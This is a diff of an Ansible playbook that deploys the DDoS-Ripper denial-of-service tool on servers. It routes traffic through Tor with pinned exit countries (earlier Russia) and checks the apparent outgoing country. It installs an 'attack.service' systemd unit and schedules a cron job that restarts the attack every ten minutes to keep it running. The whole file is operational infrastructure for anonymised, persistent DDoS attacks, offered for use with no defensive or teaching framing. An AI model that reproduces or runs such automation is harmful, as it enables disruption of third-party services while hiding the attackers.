@@ -5,63 +5,59 @@
      state: directory
      mode: '0755'
 
-
  - name: "Clone git repository for DDoS-Ripper"
    git:
      repo: "{{ git_repo }}"
      dest: "{{ git_dest }}"
 
+ - name: "Copy attack.service"
+   template:
+     src: "attack.service.j2"
+     dest: "/etc/systemd/system/attack.service"
+     owner: root
+     group: root
+     mode: '0644'
+
  - name: "Update repositories cache and install common software"
    apt:
-     name: "{{ item }}"
+     name: "{{ soft }}"
      state: latest
      update_cache: yes
-   with_items:
-       - tor
-       - tor-geoipdb
-       - proxychains
-       - geoip-bin
-       - python3
-       - python3-pip
 
- - name: Add socks config for exit nodes
+ - name: "Add socks config for exit nodes"
    lineinfile:
      path: /etc/tor/torrc
      state: present
      regexp: '^ExitNodes\s'
-     line: 'ExitNodes {ru}'
+     line: "{{ ExitNodes }}"
 
- - name: Add socks config for exit nodes
+ - name: "Add socks config for exit nodes"
    lineinfile:
      path: /etc/tor/torrc
      state: present
      regexp: '^StrictNodes\s'
      line: 'StrictNodes 1'
 
- - name: Restart tor service
+ - name: "Restart tor service"
    systemd:
      state: restarted
      name: tor
 
- - name: Copy ddos-ripper start script
-   template:
-     src: "ddos-ripper-start.sh.j2"
-     dest: "{{ git_dest }}/ddos-ripper-start.sh"
-     owner: root
-     group: root
-     mode: '0755'
-
- - name: Copy ddos-ripper stop script
-   template:
-     src: "ddos-ripper-stop.sh.j2"
-     dest: "{{ git_dest }}/ddos-ripper-stop.sh"
-     owner: root
-     group: root
-     mode: '0755'
-
- - name: Check outgoing country
-   shell: geoiplookup $(torsocks -P 9050 curl -s ifconfig.me)
+ - name: "Check outgoing country"
+   shell: geoiplookup $(torsocks curl -s ifconfig.me)
    register: country
 
  - debug:
      var: country
+
+ - name: "Restart attack service"
+   systemd:
+     state: restarted
+     daemon_reload: yes
+     name: attack.service
+
+ - name: "Cron restart attack service"
+   cron:
+     name: "restart attack service"
+     minute: "*/10"
+     job: "systemctl restart attack.service"
